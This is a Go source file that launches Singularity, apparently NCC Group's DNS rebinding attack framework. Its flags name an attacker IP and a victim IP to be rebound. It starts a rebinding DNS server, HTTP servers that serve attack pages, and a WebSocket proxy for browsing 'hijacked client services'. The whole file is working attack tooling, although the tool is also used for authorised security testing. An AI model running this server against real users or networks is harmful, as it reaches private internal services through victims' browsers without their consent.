package main

import (
	"flag"
	"fmt"
	"log"
	"net/http"
	"strconv"
	"time"

	"github.com/nccgroup/singularity"

	"github.com/miekg/dns"
)

type arrayPortFlags []int

func (a *arrayPortFlags) String() string {
	return fmt.Sprintf("%T", a)
}

func (a *arrayPortFlags) Set(value string) error {
	i, err := strconv.Atoi(value)
	if err != nil {
		log.Fatal("Could not convert port number string to int")
	}
	*a = append(*a, i)
	return nil
}

// Parse command line arguments and capture these into a runtime structure
func initFromCmdLine() *singularity.AppConfig {
	var appConfig = singularity.AppConfig{}
	var myArrayPortFlags arrayPortFlags

	var responseIPAddr = flag.String("ResponseIPAddr", "192.168.0.1",
		"Specify the attacker host IP address that will be rebound to the victim host address using strategy specified by flag \"-DNSRebingStrategy\"")
	var responseReboundIPAddr = flag.String("ResponseReboundIPAddr", "127.0.0.1",
		"Specify the victim host IP address that is rebound from the attacker host address")
	var responseReboundIPAddrtimeOut = flag.Int("responseReboundIPAddrtimeOut", 300,
		"Specify delay (s) for which we will keep responding with Rebound IP Address after last query. After delay, we will respond with  ResponseReboundIPAddr.")
	var dangerouslyAllowDynamicHTTPServers = flag.Bool("dangerouslyAllowDynamicHTTPServers", false, "DANGEROUS if the flag is set (to anything). Specify if any target can dynamically request Singularity to allocate an HTTP Server on a new port.")
	var WsHttpProxyServerPort = flag.Int("WsHttpProxyServerPort", 3129,
		"Specify the attacker HTTP Proxy Server and Websockets port that permits to browse hijacked client services.")
	var enableLinuxTProxySupport = flag.Bool("enableLinuxTProxySupport", false, "Specify whether to enable Linux TProxy support or not. Useful to listen on many ports with an appropriate iptables configuration.")
	flag.Var(&myArrayPortFlags, "HTTPServerPort", "Specify the attacker HTTP Server port that will serve HTML/JavaScript files. Repeat this flag to listen on more than one HTTP port.")
	var dnsServerBindAddr = flag.String("DNSServerBindAddr", "0.0.0.0", "Specify the IP address the DNS server will bind to, defaults to 0.0.0.0")

	flag.Parse()
	flagset := make(map[string]bool)
	flag.Visit(func(f *flag.Flag) { flagset[f.Name] = true })

	appConfig.RebindingFn = singularity.DNSRebindFromQueryFirstThenSecond
	appConfig.RebindingFnName = "fs"

	if !flagset["HTTPServerPort"] {
		myArrayPortFlags = arrayPortFlags{8080}
	}

	appConfig.ResponseIPAddr = *responseIPAddr
	appConfig.ResponseReboundIPAddr = *responseReboundIPAddr
	appConfig.ResponseReboundIPAddrtimeOut = *responseReboundIPAddrtimeOut
	appConfig.HTTPServerPorts = myArrayPortFlags
	appConfig.AllowDynamicHTTPServers = *dangerouslyAllowDynamicHTTPServers
	appConfig.DNSServerBindAddr = *dnsServerBindAddr
	appConfig.WsHTTPProxyServerPort = *WsHttpProxyServerPort
	appConfig.EnableLinuxTProxySupport = *enableLinuxTProxySupport

	return &appConfig
}

func main() {

	appConfig := initFromCmdLine()
	authToken, err := singularity.GenerateRandomString()
	if err != nil {
		panic(fmt.Sprintf("could not generate a random number: %v", err))
	}
	fmt.Printf("Temporary secret: %v\n", authToken)
	dcss := &singularity.DNSClientStateStore{Sessions: make(map[string]*singularity.DNSClientState)}
	wscss := &singularity.WebsocketClientStateStore{Sessions: make(map[string]*singularity.WebsocketClientState)}
	hss := &singularity.HTTPServerStoreHandler{DynamicServers: make([]*http.Server, 2),
		StaticServers:           make([]*http.Server, 1),
		Errc:                    make(chan singularity.HTTPServerError, 1),
		AllowDynamicHTTPServers: appConfig.AllowDynamicHTTPServers,
		Dcss:                    dcss,
		Wscss:                   wscss,
		WsHTTPProxyServerPort:   appConfig.WsHTTPProxyServerPort,
		AuthToken:               authToken,
	}

	// Attach DNS handler function
	dns.HandleFunc(".", singularity.MakeRebindDNSHandler(appConfig, dcss))

	// Start DNS server
	dnsServerPort := 53
	dnsServer := &dns.Server{Addr: appConfig.DNSServerBindAddr + ":" + strconv.Itoa(dnsServerPort), Net: "udp"}
	log.Printf("Main: Starting DNS Server at %v\n", dnsServerPort)

	go func() {
		dnsServerErr := dnsServer.ListenAndServe()
		if dnsServerErr != nil {
			log.Fatalf("Main: Failed to start DNS server: %s\n ", dnsServerErr.Error())
		}
	}()

	defer dnsServer.Shutdown()

	for _, port := range appConfig.HTTPServerPorts {
		// Start HTTP Servers
		httpServer := singularity.NewHTTPServer(port, hss, dcss, wscss)
		httpServerErr := singularity.StartHTTPServer(httpServer, hss, false, appConfig.EnableLinuxTProxySupport)

		if httpServerErr != nil {
			log.Fatalf("Main: Could not start main HTTP Server instance: %v", httpServerErr)
		}

	}

	wsHTTPProxyServer := singularity.NewHTTPProxyServer(hss.WsHTTPProxyServerPort, dcss, wscss, hss)
	wsHTTPProxyServerErr := singularity.StartHTTPProxyServer(wsHTTPProxyServer)

	if wsHTTPProxyServerErr != nil {
		log.Fatalf("Main: Could not start proxy Webssockets/HTTP Server instance: %v", wsHTTPProxyServerErr)
	}

	expiryDuration := time.Duration(appConfig.ResponseReboundIPAddrtimeOut) * time.Second
	expireClientStateTicker := time.NewTicker(expiryDuration)

	for {
		select {
		case <-expireClientStateTicker.C:
			dcss.ExpireOldEntries(expiryDuration)
		case err := <-hss.Errc:
			log.Printf("Main: HTTP server (%v): %v", err.Port, err.Err)
		}
	}

}
